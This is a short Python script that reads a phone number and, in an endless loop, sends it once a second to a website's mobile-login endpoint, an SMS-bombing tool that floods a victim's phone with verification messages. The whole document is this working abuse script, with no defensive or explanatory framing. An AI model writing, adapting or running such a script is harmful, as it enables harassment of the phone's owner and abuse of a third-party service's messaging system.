import requests
import time
phonenum = input("Enter The Phone Number :")

urlsend = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile"
mydata = {"mobile":"+62"+phonenum} 

while True :
     requests.post(urlsend,data=mydata)
     print("Sent")
     time.sleep(1)
    
